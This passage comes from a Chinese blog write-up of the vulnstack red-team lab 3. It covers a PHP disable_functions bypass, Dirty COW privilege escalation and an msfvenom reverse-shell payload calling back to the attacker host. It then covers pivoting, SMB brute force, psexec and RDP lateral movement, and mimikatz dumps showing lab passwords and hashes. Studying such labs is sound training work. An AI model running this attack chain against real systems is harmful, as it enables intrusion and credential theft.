+<li>访问链接执行命令：<code>http://192.168.111.4/templates/protostar/bypass_disablefunc.php?cmd=id&amp;outpath=/tmp/xxx&amp;sopath=/var/www/html/templates/protostar/bypass_disablefunc_x64.so</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/27.png" alt></li>
+<li><code>uname -a</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/28.png" alt></li>
+<li>翻敏感文件、敏感信息：<code>cat /tmp/mysql/test.txt</code></li>
+<li><code>wwwuser/wwwuser_123Aqx</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/29.png" alt></li>
+<li>查看靶机IP：<code>ifconfig</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/30.png" alt></li>
+<li>攻击机192.168.111.1——代理机192.168.111.4/192.168.93.100——靶机192.168.93.120</li>
+<li>前面端口扫描得22、80、3306开启，尝试登陆ssh</li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/31.png" alt></li>
+<li>得代理机shell</li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/32.png" alt></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/33.png" alt></li>
+<li>脏牛提权</li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/34.png" alt></li>
+<li><code>scp /root/tmp/dirty.c wwwuser@192.168.111.4:/tmp/dirty.c</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/35.png" alt></li>
+<li>编译dirty.c：<code>gcc -pthread dirty.c -o dirty -lcrypt</code></li>
+<li>执行exp改密码为wwwuser@123：<code>./dirty wwwuser@123</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/36.png" alt></li>
+<li><code>su firefart</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/37.png" alt></li>
+<li>MSF生成后门shell.elf</li>
+<li><code>msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.111.3 lport=4444 -f elf &gt; /root/tmp/shell.elf</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/38.png" alt></li>
+<li>MSF开启监听</li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/39.png" alt></li>
+<li>上传后门文件，赋权执行</li>
+<li><code>scp /root/tmp/shell.elf firefart@192.168.111.4:/tmp/shell.elf</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/40.png" alt></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/41.png" alt></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/42.png" alt></li>
+<li>查看网段：</li>
+<li><code>meterpreter &gt; route</code></li>
+<li><code>meterpreter &gt; run get_local_subnets</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/43.png" alt></li>
+<li>列出已添加的路由：<code>run autoroute -p</code></li>
+<li>添加路由：<code>run autoroute -s 192.168.93.1/24</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/44.png" alt></li>
+<li><code>msf6 &gt; route</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/45.png" alt></li>
+<li>内网三台windows，扫描smb版本</li>
+<li><code>use auxiliary/scanner/smb/smb_version</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/46.png" alt></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/47.png" alt></li>
+<li>发现域：TEST</li>
+</ol>
+<h2 id="0x03-域渗透"><a href="#0x03-域渗透" class="headerlink" title="0x03 域渗透"></a>0x03 域渗透</h2><ol>
+<li><strong>smb爆破</strong></li>
+<li><code>use auxiliary/scanner/smb/smb_login</code></li>
+<li><code>set smbuser administrator</code></li>
+<li><code>set pass_file /root/pass.txt</code></li>
+<li><code>set threads 50</code></li>
+<li>爆破得192.168.93.30的账号密码为 administrator:123qwe!ASD</li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/51.png" alt></li>
+<li></li>
+<li><strong>代理设置：</strong></li>
+<li>配置文件添加代理：192.168.111.3——192.168.111.4/192.168.93.100——192.168.93.1/24</li>
+<li><code>vi /etc/proxychains.conf</code></li>
+<li><code>socks5 192.168.111.3 1080</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/48.png" alt></li>
+<li>MSF使用代理socks5</li>
+<li><code>use auxiliary/server/socks_proxy</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/49.png" alt></li>
+<li>验证：<code>proxyresolv 192.168.111.3</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/50.png" alt></li>
+<li></li>
+<li>使用<a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">impacket</a>的psexec.py登录：<code>proxychains python psexec.py administrator@192.168.93.30</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/52.png" alt></li>
+<li>查看3389端口：<code>REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/53.png" alt></li>
+<li>开启3389：<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/54.png" alt></li>
+<li>登录3389：<code>proxychains rdesktop 192.168.93.30</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/55.png" alt></li>
+<li>指定kali目录共享到192.168.93.30：<code>proxychains rdesktop 192.168.93.30 -r disk:Z=/root</code> </li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/56.png" alt></li>
+<li>上传工具，mimikatz抓hash</li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/57.png" alt><pre><code>Authentication Id : 0 ; 317712 (00000000:0004d910)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : WIN7
+Logon Server      : WIN7
+Logon Time        : 10/30/2019 11:03:31 PM
+SID               : S-1-5-21-2186870775-2197198288-2249824254-500
+ msv :    
+  [00010000] CredentialKeys
+  * NTLM     : 31c1794c5aa8547c87a8bcd0324b8337
+  * SHA1     : 128c0272959b85b330090611169d07d85cb6bd0b
+  [00010000] CredentialKeys
+  * NTLM     : 2bc31ee9ab29514308035203e98a727c
+  * SHA1     : fa51e4c93d4eacf2aaa0bfd3591a8305244612b5
+  [00000003] Primary
+  * Username : Administrator
+  * Domain   : WIN7
+  * NTLM     : 31c1794c5aa8547c87a8bcd0324b8337
+  * SHA1     : 128c0272959b85b330090611169d07d85cb6bd0b
+ tspkg :    
+ wdigest :    
+  * Username : Administrator
+  * Domain   : WIN7
+  * Password : 123qwe!ASD
+ kerberos :    
+  * Username : Administrator
+  * Domain   : WIN7
+  * Password : (null)
+ ssp :    
+ credman :    
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 10/30/2019 11:02:55 PM
+SID               : S-1-5-19
+ msv :    
+ tspkg :    
+ wdigest :    
+  * Username : (null)
+  * Domain   : (null)
+  * Password : (null)
+ kerberos :    
+  * Username : (null)
+  * Domain   : (null)
+  * Password : (null)
+ ssp :    
+ credman :    
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WIN7$
+Domain            : TEST
+Logon Server      : (null)
+Logon Time        : 10/30/2019 11:02:55 PM
+SID               : S-1-5-20
+ msv :    
+  [00000003] Primary
+  * Username : WIN7$
+  * Domain   : TEST
+  * NTLM     : bb6b48766fb280d74babb50e781bbc21
+  * SHA1     : 4ebd2d435d946f95f31d5c16351791fea97e8f43
+ tspkg :    
+ wdigest :    
+  * Username : WIN7$
+  * Domain   : TEST
+  * Password : Xp:b4*hsKA*;!&gt;;kdR2,_xtp?kPNozV.4&lt;y:lcsCdtI73*n&lt;M)&amp;&lt;GX0hY18?&#39;FezvRL0SIOYg-9Q`K?2sh:w!lyL&gt;&lt;H1&amp;VNLKHYW0`emOz9geR4im!xBKodB
+ kerberos :    
+  * Username : win7$
+  * Domain   : TEST.ORG
+  * Password : (null)
+ ssp :    
+ credman :    
+Authentication Id : 0 ; 48831 (00000000:0000bebf)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 10/30/2019 11:02:55 PM
+SID               : 
+ msv :    
+  [00000003] Primary
+  * Username : WIN7$
+  * Domain   : TEST
+  * NTLM     : bb6b48766fb280d74babb50e781bbc21
+  * SHA1     : 4ebd2d435d946f95f31d5c16351791fea97e8f43
+ tspkg :    
+ wdigest :    
+ kerberos :    
+ ssp :    
+ credman :    
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WIN7$
+Domain            : TEST
+Logon Server      : (null)
+Logon Time        : 10/30/2019 11:02:55 PM
+SID               : S-1-5-18
+ msv :    
+ tspkg :    
+ wdigest :    
+  * Username : WIN7$
+  * Domain   : TEST
+  * Password : Xp:b4*hsKA*;!&gt;;kdR2,_xtp?kPNozV.4&lt;y:lcsCdtI73*n&lt;M)&amp;&lt;GX0hY18?&#39;FezvRL0SIOYg-9Q`K?2sh:w!lyL&gt;&lt;H1&amp;VNLKHYW0`emOz9geR4im!xBKodB
+ kerberos :    
+  * Username : win7$
+  * Domain   : TEST.ORG
+  * Password : (null)
+ ssp :    
+ credman :    </code></pre></li>
+<li>搜集信息：</li>
+<li><code>ipconfig /all</code> #得域test.org</li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/59.png" alt></li>
+<li><code>net view</code> #WIN-8GA56TNV3MV、WIN2008、WIN7</li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/58.png" alt></li>
+<li>ping得 WIN-8GA56TNV3MV 为域控192.168.93.10</li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/60.png" alt></li>
+<li>查看域用户进程：<code>tasklist /v</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/61.png" alt></li>
+<li>无域进程，ipc$空连接192.168.93.20，成功</li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/62.png" alt></li>
+<li>psexec执行命令：<code>psexec.exe \\192.168.93.20 cmd.exe</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/63.png" alt></li>
+<li>把 192.168.93.20 的 C 盘映射到 192.168.93.30 的 e 盘 #虚拟机D盘为光驱</li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/64.png" alt></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/65.png" alt></li>
+<li>把mimikatz上传到 192.168.93.20，抓hash</li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/66.png" alt><pre><code>Authentication Id : 0 ; 13174272 (00000000:00c90600)
+Session           : Interactive from 2
+User Name         : Administrator
+Domain            : TEST
+Logon Server      : WIN-8GA56TNV3MV
+Logon Time        : 2019/12/15 13:24:56
+SID               : S-1-5-21-1528753600-3951244198-520479113-500
+    msv :
+     [00000002] Primary
+     * Username : Administrator
+     * Domain   : TEST
+     * LM       : fc5d63d71569f04399b419bc76e2eb34
+     * NTLM     : 18edd0cc3227be3bf61ce198835a1d97
+     * SHA1     : 0f058e319f079c15fe3449bbeffc086cfa4d231e
+    tspkg :
+     * Username : Administrator
+     * Domain   : TEST
+     * Password : zxcASDqw123!!
+    wdigest :
+     * Username : Administrator
+     * Domain   : TEST
+     * Password : zxcASDqw123!!
+    kerberos :
+     * Username : Administrator
+     * Domain   : TEST.ORG
+     * Password : zxcASDqw123!!
+    ssp :
+    credman :
+Authentication Id : 0 ; 4192214 (00000000:003ff7d6)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : WIN2008
+Logon Server      : WIN2008
+Logon Time        : 2019/12/14 19:53:47
+SID               : S-1-5-21-3814515962-2249813874-2772841674-500
+    msv :
+     [00000002] Primary
+     * Username : Administrator
+     * Domain   : WIN2008
+     * LM       : ae946ec6f4ca785b93371dee1d5ee7e6
+     * NTLM     : 31c1794c5aa8547c87a8bcd0324b8337
+     * SHA1     : 128c0272959b85b330090611169d07d85cb6bd0b
+    tspkg :
+     * Username : Administrator
+     * Domain   : WIN2008
+     * Password : 123qwe!ASD
+    wdigest :
+     * Username : Administrator
+     * Domain   : WIN2008
+     * Password : 123qwe!ASD
+    kerberos :
+     * Username : Administrator
+     * Domain   : WIN2008
+     * Password : 123qwe!ASD
+    ssp :
+    credman :
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WIN2008$
+Domain            : TEST
+Logon Server      : (null)
+Logon Time        : 2019/12/14 19:49:09
+SID               : S-1-5-20
+    msv :
+     [00000002] Primary
+     * Username : WIN2008$
+     * Domain   : TEST
+     * NTLM     : c47b1f47431b259861e615472864c698
+     * SHA1     : 5a09ade7dca624916c39473fd609c22302dd33bc
+    tspkg :
+    wdigest :
+     * Username : WIN2008$
+     * Domain   : TEST
+     * Password : 94 1f 08 44 5a 0c 6d 4d dd a9 9d 09 7a d0 72 bb e9 81 69 7e 96 9f 78 74 f2 9e d3 f2 98 74 7a 2f 49 4e b7 18 01 e5 94 75 8f 57 11 44 d4 31 17 92 25 2a d4 96 73
+36 95 87 ec 34 e8 96 74 8f b6 0a ef 05 17 af 2e 5b 08 f7 6c 4e ad 9c 3e b0 e1 c8 2f 8f bd e3 b2 e7 81 17 09 96 f6 75 b5 0d c1 e1 61 07 d2 a8 99 e5 5f 7d e9 0c 76 a3 7e 51 e5 f1 d0
+f0 da c5 0c 88 d0 1c 59 34 b9 3e 14 ab a1 7b 56 cd 9d 67 d3 19 c7 ad d9 b2 8d 72 e9 2a c2 d0 be ff e7 e7 d2 60 85 9a 99 74 8c d5 0a b5 1c 58 31 28 de 15 51 36 58 8a da 3a db 61 5d
+be f9 d5 b8 a8 5c fe 19 06 f6 ac ac 26 6d 22 80 e3 f4 f6 49 f8 92 78 9b a7 36 6d f7 c4 10 a3 8e 19 83 c5 84 ff 3f fc 9c 35 81 2d 35 42 8a 30 5a 7e ca ee 3f 50 0b c8 c6 68 a8 24 cc
+c0 52 5e b8 37 30 b7
+    kerberos :
+     * Username : win2008$
+     * Domain   : TEST.ORG
+     * Password : 94 1f 08 44 5a 0c 6d 4d dd a9 9d 09 7a d0 72 bb e9 81 69 7e 96 9f 78 74 f2 9e d3 f2 98 74 7a 2f 49 4e b7 18 01 e5 94 75 8f 57 11 44 d4 31 17 92 25 2a d4 96 73
+36 95 87 ec 34 e8 96 74 8f b6 0a ef 05 17 af 2e 5b 08 f7 6c 4e ad 9c 3e b0 e1 c8 2f 8f bd e3 b2 e7 81 17 09 96 f6 75 b5 0d c1 e1 61 07 d2 a8 99 e5 5f 7d e9 0c 76 a3 7e 51 e5 f1 d0
+f0 da c5 0c 88 d0 1c 59 34 b9 3e 14 ab a1 7b 56 cd 9d 67 d3 19 c7 ad d9 b2 8d 72 e9 2a c2 d0 be ff e7 e7 d2 60 85 9a 99 74 8c d5 0a b5 1c 58 31 28 de 15 51 36 58 8a da 3a db 61 5d
+be f9 d5 b8 a8 5c fe 19 06 f6 ac ac 26 6d 22 80 e3 f4 f6 49 f8 92 78 9b a7 36 6d f7 c4 10 a3 8e 19 83 c5 84 ff 3f fc 9c 35 81 2d 35 42 8a 30 5a 7e ca ee 3f 50 0b c8 c6 68 a8 24 cc
+c0 52 5e b8 37 30 b7
+    ssp :
+    credman :
+Authentication Id : 0 ; 13464483 (00000000:00cd73a3)
+Session           : Service from 0
+User Name         : Administrator
+Domain            : WIN2008
+Logon Server      : WIN2008
+Logon Time        : 2019/12/15 13:29:22
+SID               : S-1-5-21-3814515962-2249813874-2772841674-500
+    msv :
+     [00000002] Primary
+     * Username : Administrator
+     * Domain   : WIN2008
+     * LM       : ae946ec6f4ca785b93371dee1d5ee7e6
+     * NTLM     : 31c1794c5aa8547c87a8bcd0324b8337
+     * SHA1     : 128c0272959b85b330090611169d07d85cb6bd0b
+    tspkg :
+     * Username : Administrator
+     * Domain   : WIN2008
+     * Password : 123qwe!ASD
+    wdigest :
+     * Username : Administrator
+     * Domain   : WIN2008
+     * Password : 123qwe!ASD
+    kerberos :
+     * Username : Administrator
+     * Domain   : WIN2008
+     * Password : 123qwe!ASD
+    ssp :
+    credman :
+Authentication Id : 0 ; 13172573 (00000000:00c8ff5d)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2019/12/15 13:24:53
+SID               :
+    msv :
+    tspkg :
+    wdigest :
+    kerberos :
+     * Username : Administrator
+     * Domain   : TEST.ORG
+     * Password : zxcASDqw123!!
+    ssp :
+    credman :
+Authentication Id : 0 ; 13083293 (00000000:00c7a29d)
+Session           : Service from 0
+User Name         : Administrator
+Domain            : WIN2008
+Logon Server      : WIN2008
+Logon Time        : 2019/12/14 20:16:25
+SID               : S-1-5-21-3814515962-2249813874-2772841674-500
+    msv :
+     [00000002] Primary
+     * Username : Administrator
+     * Domain   : WIN2008
+     * LM       : ae946ec6f4ca785b93371dee1d5ee7e6
+     * NTLM     : 31c1794c5aa8547c87a8bcd0324b8337
+     * SHA1     : 128c0272959b85b330090611169d07d85cb6bd0b
+    tspkg :
+     * Username : Administrator
+     * Domain   : WIN2008
+     * Password : 123qwe!ASD
+    wdigest :
+     * Username : Administrator
+     * Domain   : WIN2008
+     * Password : 123qwe!ASD
+    kerberos :
+     * Username : Administrator
+     * Domain   : WIN2008
+     * Password : 123qwe!ASD
+    ssp :
+    credman :
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2019/12/14 19:49:09
+SID               : S-1-5-19
+    msv :
+    tspkg :
+    wdigest :
+     * Username : (null)
+     * Domain   : (null)
+     * Password : (null)
+    kerberos :
+     * Username : (null)
+     * Domain   : (null)
+     * Password : (null)
+    ssp :
+    credman :
+Authentication Id : 0 ; 89285 (00000000:00015cc5)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2019/12/14 19:49:09
+SID               :
+    msv :
+     [00000002] Primary
+     * Username : WIN2008$
+     * Domain   : TEST
+     * NTLM     : c47b1f47431b259861e615472864c698
+     * SHA1     : 5a09ade7dca624916c39473fd609c22302dd33bc
+    tspkg :
+    wdigest :
+    kerberos :
+    ssp :
+    credman :
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WIN2008$
+Domain            : TEST
+Logon Server      : (null)
+Logon Time        : 2019/12/14 19:49:09
+SID               : S-1-5-18
+    msv :
+    tspkg :
+    wdigest :
+     * Username : WIN2008$
+     * Domain   : TEST
+     * Password : 94 1f 08 44 5a 0c 6d 4d dd a9 9d 09 7a d0 72 bb e9 81 69 7e 96 9f 78 74 f2 9e d3 f2 98 74 7a 2f 49 4e b7 18 01 e5 94 75 8f 57 11 44 d4 31 17 92 25 2a d4 96 73
+36 95 87 ec 34 e8 96 74 8f b6 0a ef 05 17 af 2e 5b 08 f7 6c 4e ad 9c 3e b0 e1 c8 2f 8f bd e3 b2 e7 81 17 09 96 f6 75 b5 0d c1 e1 61 07 d2 a8 99 e5 5f 7d e9 0c 76 a3 7e 51 e5 f1 d0
+f0 da c5 0c 88 d0 1c 59 34 b9 3e 14 ab a1 7b 56 cd 9d 67 d3 19 c7 ad d9 b2 8d 72 e9 2a c2 d0 be ff e7 e7 d2 60 85 9a 99 74 8c d5 0a b5 1c 58 31 28 de 15 51 36 58 8a da 3a db 61 5d
+be f9 d5 b8 a8 5c fe 19 06 f6 ac ac 26 6d 22 80 e3 f4 f6 49 f8 92 78 9b a7 36 6d f7 c4 10 a3 8e 19 83 c5 84 ff 3f fc 9c 35 81 2d 35 42 8a 30 5a 7e ca ee 3f 50 0b c8 c6 68 a8 24 cc
+c0 52 5e b8 37 30 b7
+    kerberos :
+     * Username : win2008$
+     * Domain   : TEST.ORG
+     * Password : 94 1f 08 44 5a 0c 6d 4d dd a9 9d 09 7a d0 72 bb e9 81 69 7e 96 9f 78 74 f2 9e d3 f2 98 74 7a 2f 49 4e b7 18 01 e5 94 75 8f 57 11 44 d4 31 17 92 25 2a d4 96 73
+36 95 87 ec 34 e8 96 74 8f b6 0a ef 05 17 af 2e 5b 08 f7 6c 4e ad 9c 3e b0 e1 c8 2f 8f bd e3 b2 e7 81 17 09 96 f6 75 b5 0d c1 e1 61 07 d2 a8 99 e5 5f 7d e9 0c 76 a3 7e 51 e5 f1 d0
+f0 da c5 0c 88 d0 1c 59 34 b9 3e 14 ab a1 7b 56 cd 9d 67 d3 19 c7 ad d9 b2 8d 72 e9 2a c2 d0 be ff e7 e7 d2 60 85 9a 99 74 8c d5 0a b5 1c 58 31 28 de 15 51 36 58 8a da 3a db 61 5d
+be f9 d5 b8 a8 5c fe 19 06 f6 ac ac 26 6d 22 80 e3 f4 f6 49 f8 92 78 9b a7 36 6d f7 c4 10 a3 8e 19 83 c5 84 ff 3f fc 9c 35 81 2d 35 42 8a 30 5a 7e ca ee 3f 50 0b c8 c6 68 a8 24 cc
+c0 52 5e b8 37 30 b7
+    ssp :
+    credman :</code></pre></li>
+<li>查看域用户进程：<code>tasklist /v</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/67.png" alt></li>
+<li>直接ipc$连接：<code>net use \\192.168.93.10\c$ zxcASDqw123!! /user:test\administrator</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/68.png" alt></li>
+<li>把 192.168.93.10 的 C 盘映射到 192.168.93.30 的 f 盘：<code>net use f: \\192.168.93.10\c$ zxcASDqw123!! /user:test\administrator</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/69.png" alt></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/70.png" alt></li>
+<li>翻文件比较难找，还是命令行找：<code>findstr /s /m &quot;flag&quot; *.*</code></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/71.png" alt></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/72.png" alt></li>
+<li><img src="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/73.png" alt></li>
+</ol>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 知识来源于网络，本博客仅供于安全测试学习，禁止非法利用。——《安全法》 </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>完结——vulnstack红队评估三</p>
+    
+    <p><span class="copy-title">本文作者:</span><a  title="10fteam">10fteam</a></p>
+    <p><span class="copy-title">发布时间:</span>2021-01-18, 20:31:30</p>
+    <p><span class="copy-title">最后更新:</span>2021-01-20, 04:34:52</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/" title="完结——vulnstack红队评估三">https://10fteam.github.io/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2019-2021 10fteam</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#CTF','#encrypt_decrypt','#工具','#知识','#内网渗透','#CS','#C2','#kali','#漏洞','#HTB','#靶机','#writeup','#bypass','#Linux','#linux','#脚本','#信息搜集','#安全加固','#入侵检测','#应急响应','#CC','#拒绝服务','#DOS','#MSF','#proxy','#数据库','#database','#PHP','#代码审计','#PWN','#powershell','#域渗透','#python','#注入','#phpmyadmin','#SQL','#mssql','#Struts2','#vulhub','#CVE','#中间件','#windows','#backdoor','#xss','#DOM','#cms','#encode_decode','#shell','#后门','#靶场','#vulnhub','#僵尸网络','#webshell','#内存马','#远控','#免杀','#端口','#mimikatz','#提权','#CDN','#DLL','#蓝方','#防守','#WAF','#editor','#MISC','#逆向','#log','#后渗透','#FTP','#日志',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().split('\n').length - 1, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 40px;  <!--代码左边宽度-->
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: #fafafa;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        <!--width: 542px;-->
+        width: 270px;
+    }
+    .nav.fullscreen {
+        <!--margin-left: -542px;-->
+        margin-left: -270px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
